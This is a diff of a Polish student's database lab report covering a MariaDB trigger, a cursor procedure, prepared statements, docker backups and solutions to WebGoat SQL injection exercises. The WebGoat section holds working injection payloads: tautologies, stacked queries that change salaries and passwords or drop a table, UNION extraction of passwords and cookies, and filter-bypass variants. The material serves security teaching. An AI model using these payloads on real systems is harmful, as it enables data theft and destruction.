@@ -71,6 +71,28 @@ CREATE TABLE Pracownicy (
     FOREIGN KEY (zawod_id) REFERENCES Zawody(zawod_id)
 );
 ```
+Dodanie trigger'a sprawdzającego wysokość pensji 
+```sql
+DELIMITER $$
+
+CREATE TRIGGER ValidatePensja
+BEFORE INSERT ON Pracownicy
+FOR EACH ROW
+BEGIN
+    DECLARE pensjaMin float;
+    DECLARE pensjaMax float;
+
+    SELECT pensja_min, pensja_max INTO pensjaMin, pensjaMax
+    FROM Zawody
+    WHERE zawod_id = NEW.zawod_id;
+
+    IF NEW.pensja < pensjaMin OR NEW.pensja > pensjaMAX THEN
+        SIGNAL SQLSTATE '45000' SET MESSAGE_TEXT = 'Pensja is out of range';
+    END IF;
+END$$
+
+DELIMITER ;
+```
 
 W tabeli `Ludzie` PESEL jest unikalny, więc może być kluczem głównym, ale jedna osoba może być zatrudniona w kilku miejscach, więc w tabeli `Pracownicy` PESEL może się powtórzyć.
 
@@ -145,5 +167,227 @@ INSERT INTO Zawody(nazwa, pensja_min, pensja_max) VALUES
 
 Przypisujemy zawody przy użyciu kursora
 ```sql
--- TODO
+DELIMITER $$
+
+CREATE OR REPLACE PROCEDURE AddEmployment()
+BEGIN
+  DECLARE done BOOLEAN DEFAULT FALSE;
+  DECLARE curPesel CHAR(11);
+  DECLARE curBDate DATE;
+  DECLARE curGender ENUM('K', 'M');
+  DECLARE minSalary FLOAT;
+  DECLARE maxSalary FLOAT;
+  DECLARE rndSalary FLOAT;
+  DECLARE rndProfession INT;
+
+  DECLARE ludzieCursor CURSOR FOR
+    SELECT PESEL, data_urodzenia, plec FROM Ludzie
+    WHERE data_urodzenia <= DATE_SUB(CURDATE(), INTERVAL 18 YEAR);
+
+  DECLARE CONTINUE HANDLER FOR NOT FOUND SET done = TRUE;
+
+  OPEN ludzieCursor;
+
+  ludzieLoop: LOOP
+    IF done THEN
+      LEAVE ludzieLoop;
+    END IF;
+
+    FETCH ludzieCursor INTO curPesel, curBDate, curGender;
+
+    REPEAT
+      SELECT zawod_id, pensja_min, pensja_max
+      INTO rndProfession, minSalary, maxSalary
+      FROM Zawody
+      ORDER BY RAND()
+      LIMIT 1;
+
+      IF (rndProfession = (SELECT zawod_id FROM Zawody WHERE nazwa = 'Lekarz')) THEN
+        IF (curGender = 'M' AND curBDate < DATE_SUB(CURDATE(), INTERVAL 65 YEAR)) OR (curGender = 'K' AND curBDate < DATE_SUB(CURDATE(), INTERVAL 60 YEAR)) THEN
+          SET rndProfession = NULL;
+        END IF;
+      END IF;
+    UNTIL rndProfession IS NOT NULL END REPEAT;
+
+    SET rndSalary = minSalary + RAND() * (maxSalary - minSalary);
+
+    IF NOT EXISTS (
+      SELECT 1 FROM Pracownicy
+      WHERE PESEL = curPesel
+    ) THEN
+      INSERT INTO Pracownicy(PESEL, zawod_id, pensja) VALUES
+      (curPesel, rndProfession, rndSalary);
+    END IF;
+        
+  END LOOP;
+
+  CLOSE ludzieCursor;
+END$$
+
+DELIMITER ;
+
+CALL AddEmployment();
+```
+
+### Zad. 4
+
+Przygotowanie zapytania
+```sql
+PREPARE WomenByProfession FROM 
+    "SELECT COUNT(*) AS liczba_kobiet
+     FROM Pracownicy 
+     JOIN Ludzie ON Pracownicy.PESEL = Ludzie.PESEL
+     JOIN Zawody ON Pracownicy.zawod_id = Zawody.zawod_id
+     WHERE Ludzie.plec = 'K' AND Zawody.nazwa = ?";
+```
+Wywołanie zapytania
+```sql
+SET @nazwa_zawodu = 'Lekarz';
+EXECUTE WomenByProfession USING @nazwa_zawodu;
+```
+Zwolnienie zapytania
+```sql
+DEALLOCATE PREPARE WomenByProfession;
+```
+
+### Zad. 5
+
+1. Wykonanie backup'u bazy danych *people* do pliku `init.sql`
+```sh
+docker exec -it mariadb-lab3 mariadb-dump --routines --triggers -u root -prootpassword people > init.sql
+```
+
+2. Usunięcie bazy danych
+```sh
+docker compose down && docker volume rm lab3_db_data
+```
+
+3. Przywrócenie bazy
+```sh
+docker compose up -d
+```
+
+Backup pełny uwzględnia wykonanie kopii wszystkich danych, niezależnie od już istniejących backup'ów, a backup różnicowy zawiera tylko te pliki, które się zmieniły od ostatniego pełnego backup'u.
+
+### Zad. 6
+
+Zadania z `https://github.com/WebGoat/WebGoat/` <br>
+
+Włączanie za pomocą
+```sh
+docker run -it -p 127.0.0.1:8080:8080 -p 127.0.0.1:9090:9090 webgoat/webgoat
+```
+Zadania dostępne pod adresem `http://localhost:8080/WebGoat/login`
+
+#### SQL Injection (Intro)
+
+- Ex. 2
+```sql
+SELECT department FROM employees WHERE first_name='Bob' AND last_name='Franco';
+```
+
+- Ex. 3
+```sql
+UPDATE employees SET department='Sales' WHERE first_name='Tobi' AND last_name='Barnett'; 
+```
+
+- Ex. 4
+```sql
+ALTER TABLE employees ADD COLUMN phone VARCHAR(20);
+```
+
+- Ex. 5
+```sql
+ ```
+
+- Ex. 9
+```sql
+SELECT * FROM user_data WHERE first_name = 'John' and last_name = 'Smith' or '1' = '1';
+```
+
+- Ex. 10
+```sql
+-- Login_Count: 1
+-- User_Id: 1 OR 1=1
+SELECT * From user_data WHERE Login_Count = 1 and userid= 1 OR 1=1;
+```
+
+- Ex. 11
+```sql
+-- Employee Name: a
+-- Authentication TAN:' OR '1'='1
+```
+
+- Ex. 12
+```sql
+-- Employee Name: a
+-- Authentication TAN:'; UPDATE employees SET salary='100000' WHERE last_name='Smith' AND auth_tan='3SL99A';--
+```
+
+- Ex. 13
+```sql
+-- Action contains:'; DROP TABLE access_log;--
+```
+
+#### SQL Injection (Advanced)
+
+- Ex. 3
+Rozwiązanie 1
+```sql
+-- Name:';SELECT * FROM user_system_data;--
+SELECT * FROM user_data WHERE last_name = '';SELECT * FROM user_system_data;--'
+```
+Rozwiązanie 2
+```sql
+-- Name: Smith' UNION SELECT userid, user_name, password, cookie, password, password, 1 FROM user_system_data;--
+SELECT * FROM user_data WHERE last_name = 'Smith' UNION SELECT userid, user_name, password, cookie, password, password, 1 FROM user_system_data;--'
+```
+
+- Ex. 5
+```sql
+-- Register
+-- Username:';UPDATE SQL_CHALLENGE_USERS SET password='123' WHERE userid='tom';--
+```
+
+#### SQL Injection (Mitigation)
+
+- Ex. 5
+```
+getConnection
+PreparedStatement statement
+prepareStatement
+?
+?
+statement.setString(1,"1")
+statement.setString(2,"2")
+```
+
+- Ex. 6
+```java
+try {
+    Connection conn = DriverManager.getConnection(DBURL, DBUSER, DBPW);
+    PreparedStatement statement = conn.prepareStatement("SELECT address FROM users WHERE name=? AND email=?");
+    statement.setString(1, "name");
+    statement.setString(2, "email");
+    statement.executeUpdate();
+} catch (Exception e) {
+    System.out.println("Something went wrong!");
+}
+```
+
+- Ex. 9
+```sql
+-- Name: a';/**/select/**/*/**/from/**//**/user_system_data;--
+SELECT * FROM user_data WHERE last_name = 'a';\/**\/select\/**\/*\/**\/from\/**\/\/**\/user_system_data;--'
+```
+
+- Ex. 10
+```sql
+-- Name: a';/**/seselectlect/**/*/**/frfromom/**/user_system_data;--
+SELECT * FROM user_data WHERE last_name = 'A';\/**\/SELECT\/**\/*\/**\/FROM\/**\/USER_SYSTEM_DATA;--'
+```
+
+- Ex. 12
+```sql
+104.130.219.202
 ```
